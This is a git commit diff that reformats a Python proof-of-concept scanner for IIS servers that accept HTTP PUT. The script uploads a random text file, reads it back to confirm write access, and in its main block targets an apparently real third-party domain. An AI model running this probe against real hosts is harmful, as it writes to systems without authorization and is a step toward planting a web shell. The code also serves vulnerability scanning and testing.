0521d02e9eab1197fbe25837f0d16ed8bb46b4f1
liaolian <coderliao@qq.com>
2023-04-11 19:24:53 +0800

    项目更新与迭代

--- pocs/iis-put-getshellScan.py
+++ pocs/iis-put-getshellScan.py
@@ -1,45 +1,56 @@
-import requests,re,urllib3
+import requests, re, urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
 def randomLowercase(n):
-	key=""
-	zf="qwertyuiopasdfghjklzxcvbnm"
-	import random
-	for _ in range(n):
-		suiji1=random.randint(0,len(zf)-1)
-		key+=zf[suiji1]
-	return key
-filename=randomLowercase(6)
+    key = ""
+    zf = "qwertyuiopasdfghjklzxcvbnm"
+    import random
+    for _ in range(n):
+        suiji1 = random.randint(0, len(zf) - 1)
+        key += zf[suiji1]
+    return key
+
+
+filename = randomLowercase(6)
+
+
 def randomLowercase(n):
-	key=""
-	zf="qwertyuiopasdfghjklzxcvbnm"
-	import random
-	for _ in range(n):
-		suiji1=random.randint(0,len(zf)-1)
-		key+=zf[suiji1]
-	return key
-fileContent=randomLowercase(6)
-def scan(baseurl):
-	if baseurl[-1]=='/':
-		baseurl=baseurl
-	else:
-		baseurl=baseurl+"/"
-	url=baseurl+""+filename+".txt"
-	body=""+fileContent+""
-	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
-	response=requests.put(url,body,headers=headers,timeout=5,verify=False)
-	if response.status_code == 201:
-		r0=True
-	else:
-		r0=False
-	url=baseurl+""+filename+".txt"
-	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
-	response=requests.get(url,headers=headers,timeout=5,verify=False)
-	if response.status_code == 200 and fileContent in response.text:
-		r1=True
-	else:
-		r1=False
-	if r0 and r1:
-		return True
-	else:
-		return False
+    key = ""
+    zf = "qwertyuiopasdfghjklzxcvbnm"
+    import random
+    for _ in range(n):
+        suiji1 = random.randint(0, len(zf) - 1)
+        key += zf[suiji1]
+    return key
+
+
+fileContent = randomLowercase(6)
+
+
+def doCheck(url):
+    if url[-1] != "/":
+        url = url + "/"
+    targetUrl = url + "" + filename + ".txt"
+    body = "" + fileContent + ""
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
+    response = requests.put(targetUrl, body, headers=headers, timeout=20, verify=False)
+    if response.status_code == 201:
+        r0 = True
+    else:
+        r0 = False
+
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
+    response = requests.get(targetUrl, headers=headers, timeout=20, verify=False)
+    if response.status_code == 200 and fileContent in response.text:
+        r1 = True
+    else:
+        r1 = False
+    if r0 and r1:
+        return url
+    else:
+        return False
+
+if __name__ == '__main__':
+    print(doCheck("https://autodiscover.equippool.com/"))
